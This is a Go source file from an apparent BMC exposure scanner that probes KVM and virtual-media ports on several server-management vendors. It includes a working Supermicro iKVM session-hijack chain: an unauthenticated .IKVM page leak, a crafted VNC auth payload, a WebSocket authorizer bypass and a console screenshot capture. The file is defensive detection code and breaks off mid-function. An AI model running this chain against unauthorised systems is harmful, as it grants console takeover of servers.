package check

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"net"
	"net/http"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/crypto/tls"
	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/httpx"
	"github.com/runZeroInc/oobscan/pkg/netaddr"
)

// kvm_check.go probes the non-HTTP redirection data channels carrying the KVM
// video stream and virtual media on each BMC family, as distinct from the HTTP
// launchers that hand the viewer its token.
//
// Severity policy: a plain TCP connect only proves reachability, not
// exploitability, so those are info with the service detail attached. A cleartext
// RFB banner is a standalone VNC console and rates medium; a default credential
// that authenticates is critical. All are scoped to ClassBMC and run by default.
func init() {
	Register(Check{
		Name:        "kvm.avocent.aps",
		Description: "Avocent APS KVM console reachable (TCP/3900)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMAvocentAPS,
	})
	Register(Check{
		Name:        "kvm.ami.redirect",
		Description: "AMI KVM redirection service reachable (TCP/7578)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMAMIRedirect,
	})
	Register(Check{
		Name:        "kvm.ami.vmedia",
		Description: "AMI virtual-media daemons reachable (TCP/5120-5123)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMAMIVMedia,
	})
	Register(Check{
		Name:        "kvm.hpe.irc",
		Description: "HPE iLO integrated remote console reachable (TCP/17988/17990)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMHPEIRC,
	})
	Register(Check{
		Name:        "kvm.cisco.vkvm",
		Description: "Cisco CIMC vKVM console reachable (TCP/2068)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMCiscoVKVM,
	})
	Register(Check{
		Name:        "kvm.usbAnywhere",
		Description: "USBAnywhere / KVM-side redirection channel reachable (TCP/623)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMUSBAnywhere,
	})
	Register(Check{
		Name:        "kvm.smc.vmedia",
		Description: "SMC/ATEN virtual-media USB-over-IP slot probe (TCP/623)",
		Category:    "exposure",
		Applies:     Applicability{Vendors: []string{"supermicro"}},
		Enabled:     true,
		Run:         runKVMSMCVMedia,
	})
	Register(Check{
		Name:        "kvm.smc.ws.bypass",
		Description: "SMC/ATEN lighttpd wstunnel bypasses Redfish auth for ikvmserver (443/wss -> KVM:63630 + VM:63631)",
		Category:    "exposure",
		Applies:     Applicability{Vendors: []string{"supermicro"}},
		Enabled:     true,
		Run:         runKVMSMCWSBypass,
	})
	Register(Check{
		Name:          "kvm.smc.ikvm.sessionHijack",
		Description:   "SMC iKVM: with any valid credential, confirm console access via unauthenticated .IKVM page + capture screenshot",
		Category:      "exposure",
		Applies:       Applicability{Vendors: []string{"supermicro"}},
		Authenticated: true,
		Enabled:       true,
		Run:           runKVMSMCIKVMSessionHijack,
	})
	Register(Check{
		Name:        "kvm.vnc",
		Description: "Standalone VNC/RFB console fingerprint (5900/5901)",
		Category:    "exposure",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runKVMStandaloneVNC,
	})
}

// kvmChannelState is a resolved redirection-channel probe: a TLS listener (with
// its cert CN), a plain open TCP listener, or closed. When open, HandshakeHex
// carries the first bytes the server sent (or "" when the server waits for the
// client to speak first) as proof-of-fingerprint for downstream finding fields.
type kvmChannelState struct {
	open         bool
	proto        string // "tls" | "tcp" when open
	cn           string // TLS cert CN, when TLS
	tlsVersion   string // "TLS1.2", "TLS1.3" etc.
	alpn         string // negotiated ALPN protocol
	handshakeHex string // first ~64 bytes read from the server, hex-encoded
	tlsOutcome   string // how the peer answered the ClientHello (see tlsProbeOutcome)
}

// kvmDialOpen reports whether a TCP port on the target accepts a connection
// and captures the first bytes the server sends (up to bufLen). The bytes let
// the caller record concrete handshake evidence on the finding.
func kvmDialOpen(host string, port int, to time.Duration) (bool, []byte) {
	if to <= 0 {
		to = 3 * time.Second
	}
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), to)
	if err != nil {
		return false, nil
	}
	defer conn.Close()
	_ = conn.SetReadDeadline(time.Now().Add(min(to, 500*time.Millisecond)))
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n > 0 {
		return true, append([]byte(nil), buf[:n]...)
	}
	return true, nil
}

// kvmTLSProbe attempts a TLS handshake and returns whether it succeeded plus the
// server certificate CN. A successful handshake confirms the port really speaks
// the (TLS-wrapped) redirection protocol, not just that TCP is open.
func kvmTLSProbe(host string, port int, to time.Duration) (ok bool, cn, version, alpn, outcome string, banner []byte) {
	if to <= 0 {
		to = 3 * time.Second
	}
	d := &net.Dialer{Timeout: to}
	conn, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)), &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return false, "", "", "", tlsProbeOutcome(err), nil
	}
	defer conn.Close()
	cs := conn.ConnectionState()
	if len(cs.PeerCertificates) > 0 {
		cn = cs.PeerCertificates[0].Subject.CommonName
	}
	version = tlsVersionString(cs.Version)
	alpn = cs.NegotiatedProtocol
	_ = conn.SetReadDeadline(time.Now().Add(min(to, 500*time.Millisecond)))
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if n > 0 {
		banner = append([]byte(nil), buf[:n]...)
	}
	return true, cn, version, alpn, tlsProbeOutcome(nil), banner
}

// tlsProbeOutcome labels how the peer answered a ClientHello. A channel that
// refuses TLS still reacts in a way the device chose -- a rejection alert, a
// non-TLS reply, silence until the read deadline -- and that reaction is the
// only thing a listener which speaks no plaintext ever volunteers.
func tlsProbeOutcome(err error) string {
	if err == nil {
		return "negotiated"
	}
	var rhe tls.RecordHeaderError
	if errors.As(err, &rhe) {
		return "not-tls"
	}
	var alert tls.AlertError
	if errors.As(err, &alert) {
		return "alert-" + strconv.Itoa(int(alert))
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "no-reply"
	}
	if errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF) {
		return "closed"
	}
	switch msg := err.Error(); {
	case strings.Contains(msg, "remote error"):
		return "alert"
	case strings.Contains(msg, "reset by peer"):
		return "reset"
	}
	return "rejected"
}

// tlsVersionString maps a tls.ConnectionState.Version constant to a short
// human-readable label. The stdlib provides no such helper directly.
func tlsVersionString(v uint16) string {
	switch v {
	case tls.VersionTLS10:
		return "TLS1.0"
	case tls.VersionTLS11:
		return "TLS1.1"
	case tls.VersionTLS12:
		return "TLS1.2"
	case tls.VersionTLS13:
		return "TLS1.3"
	case tls.VersionSSL30: //nolint:staticcheck // intentionally reported
		return "SSL3.0"
	default:
		return fmt.Sprintf("0x%04x", v)
	}
}

// probeKVMChannel classifies a redirection data-channel port, replacing a bare
// TCP connect so the finding can report the confirmed protocol, not just "open".
func probeKVMChannel(host string, port int, to time.Duration) kvmChannelState {
	ok, cn, ver, alpn, outcome, banner := kvmTLSProbe(host, port, to)
	if ok {
		hh := ""
		if len(banner) > 0 {
			hh = hex.EncodeToString(banner)
		}
		return kvmChannelState{open: true, proto: "tls", cn: cn, tlsVersion: ver, alpn: alpn, handshakeHex: hh, tlsOutcome: outcome}
	}
	// Keep the refused-handshake outcome: on a listener that speaks only after
	// the client, how it turned down TLS is the sole device-reported signal.
	if ok, banner := kvmDialOpen(host, port, to); ok {
		hh := ""
		if len(banner) > 0 {
			hh = hex.EncodeToString(banner)
		}
		return kvmChannelState{open: true, proto: "tcp", handshakeHex: hh, tlsOutcome: outcome}
	}
	return kvmChannelState{}
}

// kvmVendorOr returns the identified vendor when the scan supplied one, else the
// fallback implied by the vendor-specific port the case probes.
func kvmVendorOr(t *engine.Target, fallback string) string {
	if v := identityVendor(t); v != "" {
		return v
	}
	return fallback
}

func runKVMAvocentAPS(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 3900, t.Timeout)
	if !st.open {
		return nil
	}
	return []engine.Finding{{
		Check:     "kvm.avocent.aps",
		Category:  "exposure",
		Risk:      "info",
		Port:      3900,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    kvmFieldsFrom("avocent", kvmVendorOr(t, "avocent"), 3900, st),
	}}
}

func runKVMAMIRedirect(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 7578, t.Timeout)
	if !st.open {
		return nil
	}
	return []engine.Finding{{
		Check:     "kvm.ami.redirect",
		Category:  "exposure",
		Risk:      "info",
		Port:      7578,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    kvmFieldsFrom("ami-redirect", kvmVendorOr(t, "ami"), 7578, st),
	}}
}

func runKVMAMIVMedia(ctx context.Context, t *engine.Target) []engine.Finding {
	var openPorts []string
	first, enc := 0, ""
	var proofState kvmChannelState
	for _, p := range []int{5120, 5122, 5123} {
		if st := probeKVMChannel(t.Host, p, t.Timeout); st.open {
			openPorts = append(openPorts, strconv.Itoa(p))
			if first == 0 {
				first, enc, proofState = p, st.proto, st
			}
		}
	}
	if len(openPorts) == 0 {
		return nil
	}
	fields := kvmFieldsFrom("ami-vmedia", kvmVendorOr(t, "ami"), first, proofState)
	// Overwrite / add multi-port context on top of the base fields.
	fields = append(fields,
		engine.Field{Key: "ports", Val: strings.Join(openPorts, ",")},
		engine.Field{Key: "encryption", Val: enc},
	)
	return []engine.Finding{{
		Check:     "kvm.ami.vmedia",
		Category:  "exposure",
		Risk:      "info",
		Port:      first,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    fields,
	}}
}

func runKVMHPEIRC(ctx context.Context, t *engine.Target) []engine.Finding {
	for _, p := range []int{17990, 17988} {
		if st := probeKVMChannel(t.Host, p, t.Timeout); st.open {
			fields := kvmFieldsFrom("hpe-irc", kvmVendorOr(t, "hpe"), p, st)
			// 17990 carries both the IRC remote console and the virtual-media
			// listener (fpy_accept_client); 17988 is the legacy console-only port.
			if p == 17990 {
				fields = append(fields,
					engine.Field{Key: "channelDetail", Val: "remote-console + virtual-media"},
					engine.Field{Key: "virtualMedia", Val: "true"})
			} else {
				fields = append(fields, engine.Field{Key: "channelDetail", Val: "legacy-remote-console"})
			}
			return []engine.Finding{{
				Check:     "kvm.hpe.irc",
				Category:  "exposure",
				Risk:      "info",
				Port:      p,
				Transport: "tcp",
				Protocol:  "tcp",
				Fields:    fields,
			}}
		}
	}
	return nil
}

func runKVMCiscoVKVM(ctx context.Context, t *engine.Target) []engine.Finding {
	st := probeKVMChannel(t.Host, 2068, t.Timeout)
	if !st.open {
		return nil
	}
	return []engine.Finding{{
		Check:     "kvm.cisco.vkvm",
		Category:  "exposure",
		Risk:      "info",
		Port:      2068,
		Transport: "tcp",
		Protocol:  "tcp",
		Fields:    kvmFieldsFrom("cisco-vkvm", kvmVendorOr(t, "cisco"), 2068, st),
	}}
}

// runKVMSMCIKVMSessionHijack confirms the unauthenticated .IKVM page on Supermicro
// X13/ATEN firmware: the lighttpd config skips the authorizer for /redfish/*.IKVM,
// so anyone holding the UID reaches the console without credentials. Chain:
//
//  1. Redfish login for the active IKVM UID (GET
//     /redfish/v1/Managers/1/Oem/Supermicro/IKVM, JSON field "URI").
//  2. Fetch /redfish/<UID>.IKVM with no credentials for entry_value, the
//     AES-encrypted UID in the returned HTML.
//  3. Send the 49-byte VNC auth payload on TLS TCP/5900:
//     [entry_value ASCII 24B] + [zeros 24B] + [0x00 clientType]
//  4. Read SecurityResult (0x00000000 = ok) + ServerInit.
func runKVMSMCIKVMSessionHijack(ctx context.Context, t *engine.Target) []engine.Finding {
	creds := targetCreds(t)
	if len(creds) == 0 {
		return nil // credentials required to get the Redfish IKVM UID
	}
	cred := creds[0]
	if cred.User == "" {
		return nil
	}

	to := t.Timeout
	if to <= 0 {
		to = 5 * time.Second
	}

	hc := httpx.Client(to)
	base := "https://" + netaddr.URLAuthority(t.Host)

	// Step 1: Redfish session to get the IKVM UID.
	sessURL := base + "/redfish/v1/SessionService/Sessions"
	body, _ := json.Marshal(map[string]string{"UserName": cred.User, "Password": cred.Pass})
	req, _ := http.NewRequestWithContext(ctx, "POST", sessURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	resp, err := hc.Do(req)
	if err != nil {
		return nil
	}
	token := resp.Header.Get("X-Auth-Token")
	status := resp.StatusCode
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 8192))
	_ = resp.Body.Close()
	if token == "" || status != http.StatusCreated {
		return nil
	}

	// Step 2: OEM IKVM endpoint -> JSON "URI" = "/redfish/<UID>.IKVM"
	oem := base + "/redfish/v1/Managers/1/Oem/Supermicro/IKVM"
	req2, _ := http.NewRequestWithContext(ctx, "GET", oem, nil)
	req2.Header.Set("X-Auth-Token", token)
	resp2, err := hc.Do(req2)
	if err != nil {
		return nil
	}
	if resp2.StatusCode != http.StatusOK {
		_, _ = io.Copy(io.Discard, io.LimitReader(resp2.Body, 8192))
		_ = resp2.Body.Close()
		return nil
	}
	oemBody := httpx.ReadBody(resp2.Body, 4096)
	_ = resp2.Body.Close()

	var oemJSON struct {
		URI string `json:"URI"`
	}
	if err := json.Unmarshal(oemBody, &oemJSON); err != nil || oemJSON.URI == "" {
		return nil
	}
	// URI = "/redfish/XXXXXXXXXXXXXXX.IKVM"
	ikvmURI := oemJSON.URI
	uidRe := regexp.MustCompile(`/redfish/([A-Za-z0-9_-]{5,30})\.IKVM`)
	m := uidRe.FindStringSubmatch(ikvmURI)
	if m == nil {
		return nil
	}
	uid := m[1]

	// Step 3: Fetch /redfish/<UID>.IKVM with no credentials (no auth header).
	ikvmURL := base + ikvmURI
	req3, _ := http.NewRequestWithContext(ctx, "GET", ikvmURL, nil)
	// Deliberately no X-Auth-Token -- this should succeed on vulnerable firmware.
	resp3, err := hc.Do(req3)
	if err != nil {
		return nil
	}
	if resp3.StatusCode != http.StatusOK {
		_, _ = io.Copy(io.Discard, io.LimitReader(resp3.Body, 8192))
		_ = resp3.Body.Close()
		return nil
	}
	pageBody := httpx.ReadBody(resp3.Body, 65536)
	_ = resp3.Body.Close()

	evRe := regexp.MustCompile(`entry_value[^>]*value="([^"]+)"`)
	em := evRe.Find(pageBody)
	if em == nil {
		return nil
	}
	evMatch := evRe.FindSubmatch(pageBody)
	if evMatch == nil {
		return nil
	}
	entryValue := string(evMatch[1])

	// Step 4: VNC auth with entry_value.
	// Payload: entry_value ASCII (24B, zero-padded) + zeros (24B) + clientType 0x00 = 49B.
	var authPay [49]byte
	ev := []byte(entryValue)
	for i := range 24 {
		if i < len(ev) {
			authPay[i] = ev[i]
		}
	}
	// bytes 24..47 = 0, byte 48 = 0x00 (clientType)

	vc := ikvmDial(t.Host, 5900, to)
	if vc == nil {
		return []engine.Finding{ikvmHijackUnreachableFinding(uid, entryValue, ikvmURL)}
	}
	defer vc.Close()

	width, height, serverName, authOK := ikvmAuthAndInit(vc, authPay[:], to)

	if !authOK {
		return []engine.Finding{{
			Check: "kvm.smc.ikvm.sessionHijack", Category: "exposure", Risk: "info",
			Port: 443, Transport: "tcp", Protocol: "https",
			Fields: engine.F(
				"uid", uid,
				"entryValue", entryValue,
				"ikvmURL", ikvmURL,
				"serverName", serverName,
				"proof", proofKV("path", ikvmURL, "entryValue", entryValue, "vncAuth", "failed", "serverName", serverName),
			),
		}}
	}

	// Auth succeeded -- capture a screenshot as proof.
	screenshot := ikvmScreenshot(vc, width, height, to)
	proofStr := proofKV(
		"path", ikvmURL,
		"entryValue", entryValue,
		"vncAuth", "ok",
		"serverName", serverName,
		"width", strconv.Itoa(width),
		"height", strconv.Itoa(height))
	fields := engine.F(
		"uid", uid,
		"entryValue", entryValue,
		"ikvmURL", ikvmURL,
		"serverName", serverName,
		"width", strconv.Itoa(width),
		"height", strconv.Itoa(height),
		"proof", proofStr,
	)
	if screenshot != "" {
		fields = append(fields, engine.Field{Key: "screenshot_png_b64", Val: screenshot})
	}
	return []engine.Finding{{
		Check: "kvm.smc.ikvm.sessionHijack", Category: "exposure", Risk: "info",
		Port: 443, Transport: "tcp", Protocol: "vnc",
		Fields: fields,
	}}
}

// ikvmHijackUnreachableFinding reports the leak when the console port is open
// but its TLS handshake fails, so the token could not be spent. The claim is
// still the leak, and it is high risk, so it owes evidence: the launcher page
// the device served and the session token it handed out with no credential. The
// failed console dial is not that evidence -- it says nothing about the leak --
// and it is the same on every host this arm runs for.
func ikvmHijackUnreachableFinding(uid, entryValue, ikvmURL string) engine.Finding {
	return engine.Finding{
		Check: "kvm.smc.ikvm.sessionHijack", Category: "creds", Risk: "high",
		Port: 443, Transport: "tcp", Protocol: "https",
		Fields: engine.F(
			"uid", uid,
			"entryValue", entryValue,
			"ikvmURL", ikvmURL,
			"vncReachable", "false",
			"proof", proofKV("path", ikvmURL, "uid", uid, "entryValue", entryValue, "vncTLS", "failed"),
		),
	}
}

// ikvmScreenshot captures a single raw framebuffer from an authenticated VNC
// connection and returns it as a base64-encoded PNG string. Returns "" on any
// failure (wrong encoding, timeout, etc.). The pixel format from the X13
// ServerInit is 32bpp little-endian BGRX (red_shift=16, green_shift=8, blue_shift=0).
func ikvmScreenshot(conn net.Conn, width, height int, to time.Duration) string {
	if width <= 0 || height <= 0 || width*height*4 > 8<<20 {
		return ""
	}
	vc := &vncConn{c: conn, to: min(to, 10*time.Second)}

	// SetEncodings: advertise only RAW (type 0) so the server sends raw pixels.
	setEnc := make([]byte, 8)
	setEnc[0] = 0x02 // opcode
	binary.BigEndian.PutUint16(setEnc[2:4], 1)
	// encoding[0] = 0 (RAW) -- already zero
	if !vc.write(setEnc) {
		return ""
	}

	// FramebufferUpdateRequest: full screen, non-incremental.
	fbReq := make([]byte, 10)
	fbReq[0] = 0x03 // opcode
	// incremental=0, x=0, y=0 already zero
	binary.BigEndian.PutUint16(fbReq[6:8], uint16(width))
	binary.BigEndian.PutUint16(fbReq[8:10], uint16(height))
	if !vc.write(fbReq) {
		return ""
	}

	// Read FramebufferUpdate header: opcode(1) + padding(1) + num_rects(2).
	hdr, ok := vc.read(4)
	if !ok || hdr[0] != 0x00 {
		return ""
	}
	numRects := int(binary.BigEndian.Uint16(hdr[2:4]))
	img := image.NewRGBA(image.Rect(0, 0, width, height))

	for range numRects {
		// Each rect header: x(2)+y(2)+w(2)+h(2)+encoding(4) = 12 bytes.
		rh, ok := vc.read(12)
		if !ok {
			break
		}
		rx := int(binary.BigEndian.Uint16(rh[0:2]))
		ry := int(binary.BigEndian.Uint16(rh[2:4]))
		rw := int(binary.BigEndian.Uint16(rh[4:6]))
		rht := int(binary.BigEndian.Uint16(rh[6:8]))
		enc := int32(binary.BigEndian.Uint32(rh[8:12]))

		if enc != 0 || rw <= 0 || rht <= 0 {
			continue // skip non-RAW
		}
		// A rect can never exceed the framebuffer we already bounded (8 MiB, see
		// ikvmScreenshot). A larger device-declared rect is malformed/hostile and
		// would drive an unbounded allocation -> scanner OOM; refuse it.
		if rw*rht*4 > 8<<20 {
			break
		}
		pix, ok := vc.read(rw * rht * 4)
		if !ok {
			break
		}
		for py := range rht {
			for px := range rw {
				off := (py*rw + px) * 4
				// BGRX -> RGBA
				img.SetRGBA(rx+px, ry+py, color.RGBA{
					R: pix[off+2], G: pix[off+1], B: pix[off], A: 0xFF,
				})
			}
		}
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

// ikvmDial opens a WebSocket tunnel to ikvmserver:63630 (KVM/VNC) via
// wss://host:443/ -- the lighttpd wstunnel module proxies any WebSocket connection
// to the internal KVM port without invoking the Redfish authorizer, because wstunnel
// runs before FastCGI auth in the module chain.
// Falls back to direct TLS on port 5900 if WebSocket fails.
func ikvmDial(host string, port int, to time.Duration) net.Conn {
	// Primary: WebSocket tunnel via port 443 (bypasses auth at HTTP layer)
	if ws := ikvmWSConnect(host, 443, "/", to); ws != nil {
		return ws
	}
	// Fallback: direct TLS to standalone VNC port
	d := &net.Dialer{Timeout: to}
	tc, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)),
		&tls.Config{InsecureSkipVerify: true}) //nolint:gosec
	if err != nil {
		return nil
	}
	return tc
}

// ikvmWSConnect establishes an unauthenticated WebSocket tunnel to the ikvmserver.
// Returns a net.Conn whose Read/Write deliver raw ikvmserver protocol bytes
// framed in WebSocket binary frames (opcode 0x02).
// wss://host/  -> ikvmserver:63630 (KVM)
// wss://host/vm -> ikvmserver:63631 (VM)
func ikvmWSConnect(host string, port int, path string, to time.Duration) net.Conn {
	d := &net.Dialer{Timeout: to}
	tc, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(host, strconv.Itoa(port)),
		&tls.Config{InsecureSkipVerify: true}) //nolint:gosec
	if err != nil {
		return nil
	}

	// Generate a random WebSocket key.
	keyBytes := make([]byte, 16)
	if _, err := rand.Read(keyBytes); err != nil {
		tc.Close()
		return nil
	}
	wsKey := base64.StdEncoding.EncodeToString(keyBytes)

	upgrade := fmt.Sprintf(
		"GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"+
			"Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
		path, host, wsKey)

	tc.SetDeadline(time.Now().Add(to)) //nolint:errcheck
	if _, err := tc.Write([]byte(upgrade)); err != nil {
		tc.Close()
		return nil
	}

	// Read HTTP upgrade response (consume exactly up to \r\n\r\n).
	var httpResp []byte
	oneByte := make([]byte, 1)
	for !bytes.Contains(httpResp, []byte("\r\n\r\n")) {
		n, err := tc.Read(oneByte)
		if n > 0 {
			httpResp = append(httpResp, oneByte[:n]...)
		}
		if err != nil || len(httpResp) > 4096 {
			break
		}
	}
	if !strings.Contains(string(httpResp), "101 Switching Protocols") {
		tc.Close()
		return nil
	}

	return &wsConn{conn: tc}
}

// wsConn wraps a raw WebSocket connection (after handshake) and presents a
// net.Conn interface where Read/Write deal in raw application bytes by
// transparently framing outgoing data as masked binary WebSocket frames and
// stripping frame headers from incoming binary frames.
type wsConn struct {
	conn    net.Conn
	readBuf []byte // buffered application bytes from a partially consumed frame
}

func (w *wsConn) Read(p []byte) (int, error) {
	// Drain any buffered bytes from the last frame first.
	if len(w.readBuf) > 0 {
		n := copy(p, w.readBuf)
		w.readBuf = w.readBuf[n:]
		return n, nil
	}

	// Read a WebSocket frame header (2+ bytes).
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(w.conn, hdr); err != nil {
		return 0, err
	}
	payLen := int(hdr[1] & 0x7F)
	if payLen == 126 {
		ext := make([]byte, 2)
		if _, err := io.ReadFull(w.conn, ext); err != nil {
			return 0, err
		}
		payLen = int(binary.BigEndian.Uint16(ext))
	} else if payLen == 127 {
		ext := make([]byte, 8)
		if _, err := io.ReadFull(w.conn, ext); err != nil {
			return 0, err
		}
		payLen = int(binary.BigEndian.Uint64(ext))
	}

	// An ikvm wstunnel server control frame is tiny; a device-declared giant
	// (or negative) length is malformed/hostile and a bare make([]byte, payLen)
	// would commit that much memory -> OOM crash of the whole scan (an OOM throw
	// bypasses the per-check recover()). Cap it, mirroring ssh/kex.go.
	const maxWSFrame = 1 << 20 // 1 MiB
	if payLen < 0 || payLen > maxWSFrame {
		return 0, fmt.Errorf("ws frame length %d out of range (max %d)", payLen, maxWSFrame)
	}
	// Server frames are unmasked.
	payload := make([]byte, payLen)
	if _, err := io.ReadFull(w.conn, payload); err != nil {
		return 0, err
	}

	n := copy(p, payload)
	if n < payLen {
		w.readBuf = append(w.readBuf, payload[n:]...)
	}
	return n, nil
}

func (w *wsConn) Write(p []byte) (int, error) {
	// Client frames must be masked with a random 4-byte key.
	mask := make([]byte, 4)
	if _, err := rand.Read(mask); err != nil {
		return 0, err
	}
	n := len(p)
	var hdr []byte
	if n <= 125 {
		hdr = []byte{0x82, byte(0x80 | n)}
	} else if n <= 65535 {
		hdr = []byte{0x82, 0xFE, byte(n >> 8), byte(n)}
	} else {
		hdr = []byte{0x82, 0xFF, 0, 0, 0, 0, byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
	}
	hdr = append(hdr, mask...)
	masked := make([]byte, n)
	for i, b := range p {
		masked[i] = b ^ mask[i%4]
	}
	frame := append(hdr, masked...)
	if _, err := w.conn.Write(frame); err != nil {
		return 0, err
	}
	return n, nil
}

func (w *wsConn) Close() error                       { return w.conn.Close() }
func (w *wsConn) LocalAddr() net.Addr                { return w.conn.LocalAddr() }
func (w *wsConn) RemoteAddr() net.Addr               { return w.conn.RemoteAddr() }
func (w *wsConn) SetDeadline(t time.Time) error      { return w.conn.SetDeadline(t) }
func (w *wsConn) SetReadDeadline(t time.Time) error  { return w.conn.SetReadDeadline(t) }
func (w *wsConn) SetWriteDeadline(t time.Time) error { return w.conn.SetWriteDeadline(t) }

// runKVMSMCWSBypass confirms the lighttpd wstunnel module on port 443 tunnels to
// ikvmserver without invoking the Redfish FastCGI authorizer: a WebSocket upgrade
// to wss://BMC/ reaches the KVM channel and wss://BMC/vm the virtual-media one,
// with no HTTP-layer authentication. ikvmserver's own auth still applies
// (entry_value for KVM, HMAC for VM), so this bypasses the HTTP layer only.
func runKVMSMCWSBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	to := t.Timeout
	if to <= 0 {
		to = 5 * time.Second
	}

	var findings []engine.Finding

	// KVM channel: wss://host/ -> ikvmserver:63630 (KVM/VNC).
	// The RFB server sends a 12-byte banner first; if it doesn't arrive within
	// the timeout, the 101 upgrade itself proves the tunnel is open.
	if kvmWS := ikvmWSConnect(t.Host, 443, "/", to); kvmWS != nil {
		vc := &vncConn{c: kvmWS, to: min(to, 2*time.Second)}
		banner, ok := vc.read(12)
		kvmWS.Close()
		ver := ""
		if ok && strings.HasPrefix(string(banner), "RFB ") {
			ver = parseRFBVersion(banner)
		}
		bannerBytes := 0
		if ok {
			bannerBytes = len(banner)
		}
		findings = append(findings, smcWSKVMFinding(kvmVendorOr(t, "supermicro"), ver, bannerBytes))
	}

	// VM channel: wss://host/vm -> ikvmserver:63631 (ATEN virtual-media protocol)
	if vmWS := ikvmWSConnect(t.Host, 443, "/vm", to); vmWS != nil {
		wsvc := &vncConn{c: vmWS, to: to}
		// GET_DEV_STATUS (opcode 0x08) - an unauthenticated status query.
		req := []byte{0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00}
		wsvc.write(req)
		hdr, ok := wsvc.read(8)
		if ok && hdr[3] == 0x09 {
			payLen := int(binary.LittleEndian.Uint32(hdr[4:8]))
			// Read the real reply payload so the finding carries the actual
			// server-returned slot status (pay[0]=slot count, pay[1:]=per-slot
			// status byte: 0xff=unused, 0x00=present/no-media), not a static string.
			slotStatus := ""
			if payLen > 0 && payLen <= 64 {
				if pay, okp := wsvc.read(payLen); okp && len(pay) >= 1 {
					slotStatus = fmt.Sprintf("slots=%d perSlot=%s", pay[0], hex.EncodeToString(pay[1:]))
				}
			}
			vmWS.Close()
			findings = append(findings, smcWSVMediaFinding(kvmVendorOr(t, "supermicro"), payLen, slotStatus))
		} else {
			vmWS.Close()
		}
	}

	return findings
}

// smcWSKVMFinding reports the KVM-side wstunnel. Reachability, not an auth
// bypass with impact: the wstunnel path skips the Redfish/HTTP authorizer, but
// ikvmserver's own RFB auth still gates every KVM operation, so an open tunnel
// plus a banner proves the port is reachable rather than that KVM control is
// available unauthenticated.
//
// The greeting is all a console volunteers before the client speaks, and it is
// a fixed protocol string for a firmware line, so this arm has no evidence that
// separates one host from another: it carries the marker rather than a proof
// assembled from the version and the byte count. Both are still reported as
// plain fields. The 101 status is not recorded at all -- this arm only runs
// after the upgrade completed, so it is the same on every host by construction.
func smcWSKVMFinding(vendor, rfbVersion string, bannerBytes int) engine.Finding {
	fields := engine.F(
		"vendor", vendor,
		"tunnel", "wss://host/ -> ikvmserver:63630 (KVM)",
		"httpAuth", "not-applied",
		"residualAuth", "ikvmserver RFB auth still required",
		"bannerBytes", strconv.Itoa(bannerBytes),
	)
	if rfbVersion != "" {
		fields = append(fields, engine.Field{Key: "rfbVersion", Val: rfbVersion})
	}
	fields = append(fields, engine.ProofUnavailable("rfb greeting is fixed per firmware line"))
	return engine.Finding{
		Check: "kvm.smc.ws.bypass", Category: "exposure", Risk: "info",
		Port: 443, Transport: "tcp", Protocol: "wss",
		Fields: fields,
	}
}

// smcWSVMediaFinding reports the virtual-media wstunnel. The GET_DEV_STATUS
// reply is an unauthenticated status query the ATEN vmedia daemon answers with
// no credential even directly on TCP/623 (see kvm.smc.vmedia). Reaching it via
// the wstunnel proves the tunnel skips the Redfish/HTTP authorizer, but
// mount/eject still requires ikvmserver's own VM HMAC auth, so this stays
// informational.
//
// The slot bytes are what the daemon returned and the one host-chosen value
// here; most units report the same default media configuration, so identical
// slot status across hosts is the devices agreeing, not a missing measurement.
// The proof carries them together with the payload length the daemon declared.
// The 0x09 reply opcode is not recorded -- this arm only runs when the header
// carried it, so it is the same on every host by construction. When the daemon
// declared a length but sent no payload there is nothing host-specific left,
// and the finding says so instead of proving itself with its own disclaimer.
func smcWSVMediaFinding(vendor string, payLen int, slotStatus string) engine.Finding {
	fields := engine.F(
		"vendor", vendor,
		"tunnel", "wss://host/vm -> ikvmserver:63631 (VM)",
		"vmProbe", fmt.Sprintf("GET_DEV_STATUS reply opcode=0x09 payLen=%d", payLen),
		"httpAuth", "not-applied",
